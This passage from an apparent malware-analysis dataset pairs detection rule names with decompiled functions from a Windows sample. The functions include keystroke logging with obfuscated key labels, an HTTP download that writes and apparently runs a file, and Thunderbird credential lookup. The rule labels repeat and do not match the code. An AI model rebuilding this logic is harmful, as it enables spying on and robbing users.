        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00407fc3(int32_t param_1, uint32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int64_t iVar3;\n    ulong uStack20;\n    \n    uStack20 = CONCAT44(param_3, param_2);\n    if (param_4 == 1) {\n        iVar1 = sub.msvcrt.dll_fgetpos(param_1, &uStack20);\n        if (iVar1 != 0) {\n            return 0xffffffff;\n        }\n        uStack20 = CONCAT44(uStack20._4_4_ + param_3 + CARRY4(uStack20, param_2), uStack20 + param_2);\n    }\n    else if (param_4 == 2) {\n        sub.msvcrt.dll_fflush(param_1);\n        iVar3 = sub.msvcrt.dll__filelengthi64(*(param_1 + 0x10));\n        uStack20 = iVar3 + uStack20;\n    }\n    else if (param_4 != 0) {\n        return 0xffffffff;\n    }\n    uVar2 = sub.msvcrt.dll_fsetpos(param_1, &uStack20);\n    return uVar2;\n}\n",
        "token_count": 292
    },
    "00408042": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00408042(uint param_1, int32_t param_2, int32_t *param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack1096;\n    int32_t iStack1092;\n    uint uStack1088;\n    uint uStack1072;\n    uchar auStack1060 [1044];\n    \n    iStack1096 = 0x204;\n    uStack1072 = 0;\n    sub.KERNEL32.dll_MultiByteToWideChar(0xfde9, 0, param_1, 0x204, auStack1060);\n    *param_3 = 0;\n    iVar1 = sub.msvcrt.dll__wfopen(auStack1060, 0x422f64);\n    if (iVar1 != 0) {\n        iVar2 = fcn.00407fc3(iVar1, 0, 0, 2);\n        if (iVar2 == 0) {\n            iVar2 = sub.msvcrt.dll_fgetpos(iVar1, &iStack1092);\n            if ((iVar2 == 0) && (0 < iStack1092)) {\n                if ((iStack1092 <= param_2) || (param_2 == 0)) {\n                    param_2 = iStack1092;\n                }\n                iStack1092 = 0;\n                uStack1088 = 0;\n                iVar2 = sub.msvcrt.dll_fsetpos(iVar1, &iStack1092);\n                if ((iVar2 == 0) && (iStack1096 = sub.msvcrt.dll_malloc(param_2),  iStack1096 != 0)) {\n                    iVar2 = sub.msvcrt.dll_fread(iStack1096, 1, param_2, iVar1);\n                    if (param_2 != iVar2) {\n                        iStack1096 = sub.msvcrt.dll_realloc(iStack1096, iVar2);\n                    }\n                    sub.msvcrt.dll_fclose(iVar1);\n                    *param_3 = iVar2;\n                    return iStack1096;\n                }\n            }\n        }\n        sub.msvcrt.dll_fclose(iVar1);\n        if (iStack1096 != 0) {\n            fcn.00407f59(&iStack1096);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 514
    },
    "00408306": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.00408306(int32_t param_1, char *param_2, uint param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint8_t uVar6;\n    int32_t iStack16;\n    \n    iStack16 = 0;\n    uVar3 = fcn.004125de(0, param_2, param_1);\n    if (uVar3 < 0) {\ncode_r0x00408334:\n        uVar6 = 0;\ncode_r0x004083f9:\n        uVar3 = uVar3 & 0xffffff00 | uVar6;\n        if (iStack16 != 0) {\n            uVar3 = fcn.00407f59(&iStack16);\n            uVar3 = uVar3 & 0xffffff00 | uVar6;\n        }\n    }\n    else {\n        uVar5 = 0xffffffff;\n        do {\n            if (uVar5 == 0) break;\n            uVar5 = uVar5 - 1;\n            cVar2 = *param_2;\n            param_2 = param_2 + 1;\n        } while (cVar2 != '\\0');\n        iVar1 = (uVar3 - 1) + ~uVar5;\n        iVar4 = fcn.004125de(iVar1, 0x422f70, param_1);\n        if (((0 < iVar4) && (iVar1 <= iVar4)) && (iVar4 - iVar1 < 0x40)) {\n            iVar4 = (iVar4 - iVar1) + 1;\n            iStack16 = sub.msvcrt.dll_malloc(iVar4);\n            if (iStack16 != 0) {\n                fcn.00412548(iStack16, param_1 + iVar1, iVar4);\n                uVar3 = fcn.004125de(0, 0x422f72, iStack16);\n                if (0x3f < uVar3) goto code_r0x00408334;\n                fcn.00412548(param_3, iStack16, uVar3 + 1);\n                uVar6 = 1;\n                uVar3 = fcn.00412548(param_4, uVar3 + 1 + iStack16, 8);\n                goto code_r0x004083f9;\n            }\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 565
    },
    "004093d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004093d0(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char acStack545 [21];\n    uchar auStack524 [512];\n    \n    if (0 < *(param_1 + 0x618)) {\n        pcVar2 = \"%d\\a%d\\ahttp://%s%s\\a%s\";\n        pcVar3 = acStack545;\n        for (iVar1 = 0x15; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *pcVar3 = *pcVar2;\n            pcVar2 = pcVar2 + 1;\n            pcVar3 = pcVar3 + 1;\n        }\n        iVar1 = fcn.004127a8(auStack524, 0x200, acStack545, *(param_1 + 0x614), param_2, param_1 + 0x204, param_1, \n                             param_1 + 0x408);\n        if (0 < iVar1) {\n            fcn.00405d7d(*(param_1 + 0x618), 0xc4, auStack524, iVar1);\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 280
    },
    "004093e7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nuint32_t fcn.004093e7(void)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    uint *puVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint8_t uVar12;\n    uint *puVar13;\n    int32_t **ppiVar14;\n    uint uStack100;\n    int32_t aiStack96 [6];\n    char *apcStack72 [2];\n    int32_t aiStack64 [2];\n    int32_t aiStack56 [4];\n    int32_t aiStack40 [2];\n    char *pcStack32;\n    int32_t aiStack28 [3];\n    \n    aiStack28[2] = 0x4093f5;\n    iVar5 = fcn.0041f3f0();\n    iVar5 = -iVar5;\n    iVar7 = *(&stack0x00001450 + iVar5);\n    *(&stack0x00000014 + iVar5) = 0xffffffff;\n    *(iVar7 + 0x614) = *0x42b464;\n    *(&stack0xfffffff4 + iVar5) = 0;\n    *(&stack0xfffffff0 + iVar5) = iVar7;\n    *(&stack0xffffffec + iVar5) = 0x40942b;\n    *0x42b464 = *0x42b464 + 1;\n    fcn.004093d0();\n    *(&stack0xfffffff8 + iVar5) = 0;\n    *(&stack0xfffffff4 + iVar5) = 1;\n    *(&stack0xfffffff0 + iVar5) = 2;\n    *(&stack0xffffffec + iVar5) = 0x409447;\n    uVar6 = sub.WS2_32.dll_socket();\n    ppiVar14 = &stack0xffffffe4 + iVar5;\n    *(&stack0x00000008 + iVar5) = uVar6;\n    *(&stack0xffffffec + iVar5) = &stack0x0000000c + iVar5;\n    uVar6 = *(*(&stack0x00001444 + iVar5) + 0x610);\n    *(&stack0xffffffe4 + iVar5) = *(&stack0x00001444 + iVar5) + 0x204;\n    *(&stack0xffffffe8 + iVar5) = uVar6;\n    *(&stack0xffffffe0 + iVar5) = 0x409474;\n    cVar4 = fcn.004051b5();\n    if (cVar4 == '\\0') {\n        uVar12 = 0;\n        piVar8 = 0x1;\n    }\n    else {\n        *(&stack0xffffffec + iVar5) = 0x10;\n        *(&stack0xffffffe8 + iVar5) = &stack0x0000000c + iVar5;\n        *(&stack0xffffffe4 + iVar5) = *(&stack0x00000008 + iVar5);\n        *(&stack0xffffffe0 + iVar5) = 0x409494;\n        iVar7 = sub.WS2_32.dll_connect();\n        puVar2 = &stack0xffffffd8;\n        if (-1 < iVar7) {\n            puVar1 = &stack0x00000418 + iVar5;\n            *(&stack0xffffffe0 + iVar5) =\n                 \"GET %s HTTP/1.1\\r\\nHost: %s \\r\\nUser-Agent: Mozilla/4.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nAccept-Language: en-US,en;q=0.8\\r\\nConnection: close\\r\\n\\r\\n\"\n            ;\n            *(&stack0xffffffdc + iVar5) = 0x1000;\n            *(puVar2 + iVar5) = puVar1;\n            *(&stack0xffffffe4 + iVar5) = *(&stack0x00001438 + iVar5);\n            *(&stack0xffffffe8 + iVar5) = *(&stack0x00001438 + iVar5) + 0x204;\n            *(&stack0xffffffd4 + iVar5) = 0x4094db;\n            iVar7 = fcn.004127a8();\n            *(&stack0xffffffe0 + iVar5) = iVar7;\n            *(&stack0xffffffe4 + iVar5) = 0;\n            *(&stack0xffffffdc + iVar5) = puVar1;\n            *(puVar2 + iVar5) = *(&stack0xfffffffc + iVar5);\n            *(&stack0xffffffd4 + iVar5) = 0x4094f9;\n            iVar9 = sub.WS2_32.dll_send();\n            puVar2 = &stack0xffffffc8;\n            if (iVar7 == iVar9) {\n                *(&stack0xffffffd0 + iVar5) = 0x1000;\n                *(&stack0xffffffcc + iVar5) = 0;\n                *(puVar2 + iVar5) = puVar1;\n                *(&stack0xffffffc4 + iVar5) = 0x409518;\n                fcn.004129e4();\n                *(&stack0xffffffd4 + iVar5) = 0;\n                *(&stack0xffffffd0 + iVar5) = 0x1000;\n                *(&stack0xffffffcc + iVar5) = puVar1;\n                *(puVar2 + iVar5) = *(&stack0xffffffec + iVar5);\n                *(&stack0xffffffc4 + iVar5) = 0x409538;\n                iVar7 = sub.WS2_32.dll_recv();\n                if (iVar7 != 0) {\n                    if (iVar7 == 0x1000) {\n                        (&stack0x000013f7)[iVar5] = 0;\n                    }\n                    *(&stack0xffffffc0 + iVar5) = puVar1;\n                    *(&stack0xffffffbc + iVar5) = \"200 OK\";\n                    *(&stack0xffffffb8 + iVar5) = 0;\n                    *(&stack0xffffffb4 + iVar5) = 0x409574;\n                    iVar9 = fcn.004125de();\n                    if (iVar9 != -1) {\n                        *(&stack0xffffffc0 + iVar5) = puVar1;\n                        *(&stack0xffffffbc + iVar5) = \"\\r\\n\\r\\n\";\n                        *(&stack0xffffffb8 + iVar5) = 0;\n                        *(&stack0xffffffb4 + iVar5) = 0x40958f;\n                        iVar9 = fcn.004125de();\n                        if (iVar9 != -1) {\n                            *(&stack0xffffffcc + iVar5) = 0x204;\n                            *(&stack0xffffffc4 + iVar5) = 0x204;\n                            *(&stack0xffffffc8 + iVar5) = &stack0xfffffff0 + iVar5;\n                            *(&stack0xffffffbc + iVar5) = 0;\n                            *(&stack0xffffffb8 + iVar5) = 0xfde9;\n                            *(&stack0xffffffc0 + iVar5) = *(&stack0x00001418 + iVar5) + 0x408;\n                            *(&stack0xffffffb4 + iVar5) = 0x4095d3;\n                            sub.KERNEL32.dll_MultiByteToWideChar();\n                            ppiVar14 = &stack0xffffffa0 + iVar5;\n                            *(&stack0xffffffa0 + iVar5) = &stack0xfffffff0 + iVar5;\n                            *(&stack0xffffffa4 + iVar5) = 0x4231ca;\n                            *(&stack0xffffff9c + iVar5) = 0x4095e6;\n                            iVar10 = sub.msvcrt.dll__wfopen();\n                            if (iVar10 == 0) {\n                                uVar12 = 0;\n                                piVar8 = 0x3;\n                            }\n                            else {\n                                *(&stack0xffffffac + iVar5) = iVar10;\n                                *(&stack0xffffffa8 + iVar5) = iVar7 - (iVar9 + 4);\n                                *(&stack0xffffffa4 + iVar5) = 1;\n                                *(&stack0xffffffa0 + iVar5) = puVar1 + iVar9 + 4;\n                                *(&stack0xffffff9c + iVar5) = 0x40960c;\n                                sub.msvcrt.dll_fwrite();\n                                puVar3 = &stack0xffffffa0 + iVar5;\n                                do {\n                                    puVar13 = puVar3;\n                                    puVar13[3] = 0;\n                                    puVar13[2] = 0x1000;\n                                    puVar13[1] = puVar1;\n                                    *puVar13 = puVar13[9];\n                                    puVar13[-1] = 0x40962c;\n                                    iVar7 = sub.WS2_32.dll_recv();\n                                    ppiVar14 = puVar13 + -4;\n                                    if (iVar7 == 0) {\n                                        puVar13[-4] = iVar10;\n                                        puVar13[-5] = 0x40966a;\n                                        sub.msvcrt.dll_fclose();\n                                        if (*(puVar13[0x514] + 0x60c) != '\\0') {\n                                            puVar13[-2] = 1;\n                                            puVar13[-3] = 0x4231d0;\n                                            puVar13[-4] = puVar13[0x514] + 0x408;\n                                            puVar13[-5] = 0x409697;\n                                            fcn.00406c2a();\n                                        }\n                                        uVar12 = 1;\n                                        piVar8 = 0x6;\n                                        goto code_r0x004096b2;\n                                    }\n                                    puVar13[-1] = iVar10;\n                                    puVar13[-2] = iVar7;\n                                    puVar13[-3] = 1;\n                                    puVar13[-4] = puVar1;\n                                    puVar13[-5] = 0x40964d;\n                                    iVar5 = sub.msvcrt.dll_fwrite();\n                                    puVar3 = puVar13 + -4;\n                                } while (iVar7 == iVar5);\n                                puVar13[-4] = iVar10;\n                                uVar12 = 0;\n                                puVar13[-5] = 0x40965b;\n                                sub.msvcrt.dll_fclose();\n                                piVar8 = 0x4;\n                                ppiVar14 = puVar13 + -4;\n                            }\n                            goto code_r0x004096b2;\n                        }\n                    }\n                }\n                uVar12 = 0;\n                piVar8 = 0x5;\n                ppiVar14 = &stack0xffffffb8 + iVar5;\n                goto code_r0x004096b2;\n            }\n        }\n        uVar12 = 0;\n        piVar8 = 0x2;\n        ppiVar14 = puVar2 + iVar5;\n    }\ncode_r0x004096b2:\n    ppiVar14[1] = piVar8;\n    *ppiVar14 = ppiVar14[0x518];\n    ppiVar14[-1] = 0x4096c5;\n    fcn.004093d0();\n    *ppiVar14 = ppiVar14 + 0x518;\n    ppiVar14[-1] = 0x4096d4;\n    fcn.00407f59();\n    *ppiVar14 = ppiVar14 + 9;\n    ppiVar14[-1] = 0x4096e0;\n    uVar11 = fcn.00405999();\n    return uVar11 & 0xffffff00 | uVar12;\n}\n",
        "token_count": 2649
    },
    "00409953": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00409953(uint32_t param_1)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uchar *puStack1000;\n    uint uStack996;\n    uchar *puStack992;\n    uint uStack988;\n    uint32_t uStack984;\n    uint uStack980;\n    char *pcStack976;\n    uchar *puStack972;\n    uchar auStack912 [56];\n    uchar auStack856 [160];\n    uchar auStack696 [140];\n    uchar auStack556 [252];\n    uchar auStack304 [288];\n    \n    uVar2 = sub.USER32.dll_GetKeyState();\n    sub.USER32.dll_GetKeyState();\n    sub.USER32.dll_GetKeyState();\n    puStack972 = 0x409999;\n    sub.USER32.dll_GetKeyState();\n    pcStack976 = 0x4099a9;\n    puStack972 = &stack0xfffffdd4;\n    sub.USER32.dll_GetKeyboardState();\n    if (param_1 == 0x22) {\n        pcStack976 = \"[9Cnd aWgR]\";\n    }\n    else if (param_1 < 0x23) {\n        if (param_1 < 0x13) {\n            if (0xf < param_1) {\n                return;\n            }\n            if (param_1 == 9) {\n                pcStack976 = \"[qCV]\";\n            }\n            else if (param_1 == 0xd) {\n                pcStack976 = \"[jR5d0]\";\n            }\n            else {\n                if (param_1 != 8) goto code_r0x00409b22;\n                pcStack976 = \"[cCYw6sCYd]\";\n            }\n        }\n        else if (param_1 == 0x14) {\n            pcStack976 = \"[PCs6 mWYw]\";\n        }\n        else if (param_1 < 0x14) {\n            pcStack976 = \"[c0dCw]\";\n        }\n        else if (param_1 == 0x1b) {\n            pcStack976 = \"[j6Y]\";\n        }\n        else {\n            if (param_1 != 0x21) goto code_r0x00409b22;\n            pcStack976 = \"[9Cnd us]\";\n        }\n    }\n    else if (param_1 == 0x27) {\n        pcStack976 = \"[D00Wg r4nI5]\";\n    }\n    else if (param_1 < 0x28) {\n        if (param_1 == 0x24) {\n            pcStack976 = \"[-Wld]\";\n        }\n        else if (param_1 < 0x24) {\n            pcStack976 = \"[jRS]\";\n        }\n        else if (param_1 == 0x25) {\n            pcStack976 = \"[D00Wg md85]\";\n        }\n        else {\n            if (param_1 != 0x26) goto code_r0x00409b22;\n            pcStack976 = \"[D00Wg us]\";\n        }\n    }\n    else if (param_1 == 0x2d) {\n        pcStack976 = \"[XR6d05]\";\n    }\n    else if (param_1 < 0x2e) {\n        if (param_1 == 0x28) {\n            pcStack976 = \"[D00Wg aWgR]\";\n        }\n        else {\n            if (param_1 != 0x2c) {\ncode_r0x00409b22:\n                puStack972 = NULL;\n                pcStack976 = param_1;\n                uStack980 = 0x409b38;\n                uStack980 = sub.USER32.dll_MapVirtualKeyW();\n                uStack984 = param_1;\n                uStack988 = 0x409b65;\n                pcStack976 = &stack0xfffffdd4;\n                puStack972 = &stack0xfffffd48;\n                iVar3 = sub.USER32.dll_ToUnicode();\n                if (iVar3 == 1) {\n                    puStack992 = &stack0xfffffc70;\n                    uStack980 = 0;\n                    uStack984 = 0;\n                    uStack988 = 0x40;\n                    uStack996 = 0xffffffff;\n                    puStack1000 = &stack0xfffffd48;\n                    sub.KERNEL32.dll_WideCharToMultiByte(0xfde9, 0);\n                    sub.USER32.dll_GetKeyState(0x11);\n                }\n                else {\n                    iVar3 = sub.USER32.dll_MapVirtualKeyW(param_1, 0);\n                    iVar3 = sub.USER32.dll_GetKeyNameTextW(iVar3 << 0x10, &stack0xfffffca8, 0x40);\n                    if (iVar3 < 1) {\n                        return;\n                    }\n                    uVar1 = sub.USER32.dll_GetKeyState(0x11);\n                    if ((((uVar2 & 0x8000) == 0) && (1 < uVar1)) && (param_1 - 0x30 < 10)) {\n                        fcn.004081aa(\"[P50i+%Y]\");\n                    }\n                    else {\n                        sub.KERNEL32.dll_WideCharToMultiByte\n                                  (0xfde9, 0, &stack0xfffffca8, 0xffffffff, &stack0xfffffc18, 0x40, 0, 0);\n                    }\n                }\n                iVar3 = fcn.004127a8();\n                goto code_r0x00409ccc;\n            }\n            pcStack976 = \"[904R5 MY0ddR]\";\n        }\n    }\n    else if (param_1 == 0x2e) {\n        pcStack976 = \"[adid5d]\";\n    }\n    else {\n        if (param_1 != 0x91) goto code_r0x00409b22;\n        pcStack976 = \"[MY0Wii mWYw]\";\n    }\n    uStack980 = 0x409b02;\n    fcn.004081aa();\n    pcStack976 = &stack0xfffffed0;\n    puStack972 = 0x100;\n    uStack980 = 0x409b1d;\n    iVar3 = fcn.004127a8();\ncode_r0x00409ccc:\n    if ((0 < iVar3) && (iVar3 = fcn.0040970c(),  iVar3 == 0)) {\n        *0x422830 = 1;\n    }\n    return;\n}\n",
        "token_count": 1414
    },
    "00409ffd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00409ffd(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iStack532;\n    uchar auStack528 [520];\n    \n    iStack532 = 0;\n    cVar1 = fcn.004082e8(0x40);\n    if (cVar1 != '\\0') {\n        fcn.004127a8(auStack528, 0x204, 0x42330d, 0x422400, param_2);\n        iVar2 = fcn.00408042(auStack528, 0, &iStack532);\n        if ((iVar2 != 0) && (0 < iStack532)) {\n            iVar3 = sub.msvcrt.dll_malloc(0x230);\n            *(iVar3 + 0x204) = iVar2;\n            *(iVar3 + 0x210) = param_1;\n            *(iVar3 + 0x208) = 0;\n            *(iVar3 + 0x20c) = 0xd0;\n            *(iVar3 + 0x20d) = 0xd1;\n            *(iVar3 + 0x218) = iStack532;\n            *(iVar3 + 0x20e) = 0xd2;\n            *(iVar3 + 0x21c) = iStack532 >> 0x1f;\n            *(iVar3 + 0x220) = 0;\n            *(iVar3 + 0x224) = 0;\n            fcn.00407f08(0x413eb3, iVar3);\n            return;\n        }\n    }\n    fcn.00405d7d(param_1, 0xd2, 0, 0);\n    return;\n}\n",
        "token_count": 395
    },
    "0040a4bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040a4bc(uint param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    char *pcVar8;\n    char *pcVar9;\n    ulong uVar10;\n    uint uVar11;\n    code *pcStack684;\n    int32_t iStack668;\n    uint32_t uStack664;\n    int32_t aiStack660 [2];\n    int32_t iStack652;\n    uint uStack648;\n    uint uStack644;\n    int32_t iStack640;\n    ushort uStack634;\n    ushort uStack632;\n    ushort uStack628;\n    ushort uStack626;\n    ushort uStack624;\n    ushort uStack622;\n    uchar auStack620 [3];\n    char acStack617 [45];\n    uchar auStack572 [548];\n    uint uStack24;\n    \n    cVar1 = fcn.0041236c(auStack620, 0x8000);\n    if (cVar1 == '\\0') {\n        fcn.00405d7d(param_1, 0xbd, 0, 0);\n    }\n    else {\n        uVar2 = fcn.004081aa(\"MdYQ0Nh.Sii\");\n        iVar3 = sub.KERNEL32.dll_LoadLibraryA(uVar2);\n        if (iVar3 != 0) {\n            uVar2 = fcn.004081aa(\"m6CEd5mWnWRMd664WRaC5C\");\n            iStack668 = sub.KERNEL32.dll_GetProcAddress(iVar3, uVar2);\n            uVar2 = fcn.004081aa(\"m6C_0ddrd5Q0RcQ88d0\");\n            iVar4 = sub.KERNEL32.dll_GetProcAddress(iVar3, uVar2);\n            uVar2 = fcn.004081aa(\"m6CjRQld0C5dmWnWRMd664WR6\");\n            pcVar5 = sub.KERNEL32.dll_GetProcAddress(iVar3, uVar2);\n            if ((pcStack684 != NULL && iVar4 != 0) && (pcVar5 != NULL)) {\n                uVar7 = 0;\n                iVar4 = (*pcVar5)(&uStack664, &iStack668);\n                if (iVar4 == 0) {\n                    for (; uVar7 < uStack664; uVar7 = uVar7 + 1) {\n                        uVar10 = (*pcStack684)(iStack668, aiStack660, iVar3, uVar2);\n                        uVar2 = uVar10 >> 0x20;\n                        if (uVar10 == 0) {\n                            uStack648 = *(iStack652 + 0x30);\n                            uStack644 = *(iStack652 + 0x34);\n                            sub.KERNEL32.dll_FileTimeToSystemTime(iVar3, &uStack626);\n                            pcVar8 = \"%lu\\a%S\\a%S\\a%S\\a%.2d/%.2d/%d %.2d:%.2d:%.2d\\a%S\\a\";\n                            pcVar9 = acStack617;\n                            for (iVar4 = 0x2d; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                *pcVar9 = *pcVar8;\n                                pcVar8 = pcVar8 + 1;\n                                pcVar9 = pcVar9 + 1;\n                            }\n                            uVar2 = *(aiStack660[0] + 0x24);\n                            iVar4 = fcn.004127a8(acStack617, 0x204, iVar3, uVar2, *(aiStack660[0] + 0x10), \n                                                 *(aiStack660[0] + 0x18), *(aiStack660[0] + 0x20), uStack628, uStack632\n                                                 , uStack634, uStack626, uStack624, uStack622, *(aiStack660[0] + 0x3c));\n                            if (iVar4 != -1) {\n                                fcn.00412458(auStack620, auStack572);\n                            }\n                        }\n                        iStack668 = iStack668 + 8;\n                    }\n                }\n            }\n        }\n        if (iStack640 == 0) {\n            uVar6 = 0;\n            uVar2 = 0;\n            uVar11 = 0xbd;\n        }\n        else {\n            uVar6 = fcn.00412540(auStack620);\n            uVar11 = 0xbc;\n            uVar2 = uStack648;\n        }\n        fcn.00405d7d(uStack24, uVar11, uVar2, uVar6);\n        fcn.004123b1(auStack620);\n    }\n    return;\n}\n",
        "token_count": 1066
    },
    "0040b34d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0040b34d(uint param_1, int32_t param_2, int32_t param_3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    uint8_t uStack1581;\n    uchar auStack1576 [516];\n    uchar auStack1060 [516];\n    uchar auStack544 [528];\n    \n    uVar2 = fcn.0040b1f4(param_1, auStack1060, 0x204);\n    uStack1581 = uVar2;\n    if (uStack1581 == 0) {\ncode_r0x0040b429:\n        uStack1581 = 0;\n    }\n    else {\n        iVar5 = 0;\n        do {\n            uVar3 = fcn.004081aa(*(iVar5 * 4 + 0x422980));\n            fcn.004127a8(auStack1576, 0x204, 0x4233dd, auStack1060, uVar3);\n            if (iVar5 == 0) {\n                iVar4 = 0;\n                do {\n                    uVar3 = fcn.004081aa(*(iVar4 + 0x4228c0));\n                    fcn.004127a8(auStack544, 0x204, 0x4233dd, auStack1060, uVar3);\n                    cVar1 = fcn.00406f1a(auStack544);\n                    if (cVar1 != '\\0') {\n                        uVar2 = fcn.00407f7a(auStack544);\n                        *(param_3 + iVar4) = uVar2;\n                        if (uVar2 == 0) goto code_r0x0040b429;\n                    }\n                    iVar4 = iVar4 + 4;\n                } while (iVar4 != 0xb0);\n                cVar1 = fcn.00406f1a(auStack1576);\n                if (cVar1 == '\\0') {\n                    uVar3 = fcn.004081aa(\"lWkQ54i6.Sii\");\n                    fcn.004127a8(auStack1576, 0x204, 0x4233dd, auStack1060, uVar3);\n                }\n                cVar1 = fcn.00406f1a(auStack1576);\n                if (cVar1 == '\\0') {\n                    pcVar6 = \"lWkniQd.Sii\";\ncode_r0x0040b4a3:\n                    uVar3 = fcn.004081aa(pcVar6);\n                    fcn.004127a8(auStack1576, 0x204, 0x4233dd, auStack1060, uVar3);\n                }\n            }\n            else if ((iVar5 == 1) && (cVar1 = fcn.00406f1a(auStack1576),  cVar1 == '\\0')) {\n                pcVar6 = \"lWk67i45dN.Sii\";\n                goto code_r0x0040b4a3;\n            }\n            uVar2 = fcn.00406f1a(auStack1576);\n            if (uVar2 != '\\0') {\n                uVar2 = fcn.00407f7a(auStack1576);\n                *(param_2 + iVar5 * 4) = uVar2;\n                if (uVar2 == 0) goto code_r0x0040b429;\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 != 9);\n    }\n    return uVar2 & 0xffffff00 | uStack1581;\n}\n",
        "token_count": 830
    },
    "0040b5a1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.0040b5a1(void)\n\n{\n    code **ppcVar1;\n    char **ppcVar2;\n    char **ppcVar3;\n    int32_t **ppiVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint uVar8;\n    int32_t iVar9;\n    code *pcVar10;\n    code *pcVar11;\n    char *pcVar12;\n    char *pcVar13;\n    int32_t *piVar14;\n    int32_t *piVar15;\n    int32_t *piVar16;\n    uint32_t uVar17;\n    uchar *puVar18;\n    char **ppcVar19;\n    int32_t **ppiVar20;\n    uint *puVar21;\n    int32_t *piVar22;\n    int32_t *piVar23;\n    char **ppcVar24;\n    char **ppcVar25;\n    char **ppcVar26;\n    char **ppcVar27;\n    uint *puVar28;\n    uint *puVar29;\n    int32_t **ppiVar30;\n    int32_t *piVar31;\n    int32_t **ppiVar32;\n    int32_t **ppiVar33;\n    uint *puVar34;\n    int32_t **ppiVar35;\n    uint *puVar36;\n    int32_t **ppiVar37;\n    uchar *puVar38;\n    char **ppcVar39;\n    int32_t **ppiVar40;\n    uint uStack20;\n    \n    uStack20 = 0x40b5af;\n    iVar6 = fcn.0041f3f0();\n    iVar6 = -iVar6;\n    ppiVar20 = &stack0xfffffff0 + iVar6;\n    ppiVar37 = &stack0xfffffff0 + iVar6;\n    *(&stack0x0000005c + iVar6) = 0;\n    *(&stack0x00000060 + iVar6) = 0;\n    if (*(&stack0x00001c00 + iVar6) == 2) {\n        *(&stack0xfffffff0 + iVar6) = \"Mozilla Thunderbird\";\n        *(&stack0xfffffff8 + iVar6) = &stack0x00000124 + iVar6;\n        *(&stack0xfffffff4 + iVar6) = &stack0x00000080 + iVar6;\n        *(&stack0xffffffec + iVar6) = 0x40b6b0;\n        cVar5 = fcn.0040b34d();\n        if (cVar5 == '\\0') {\n            return 0;\n        }\n        *(&stack0xfffffff0 + iVar6) = 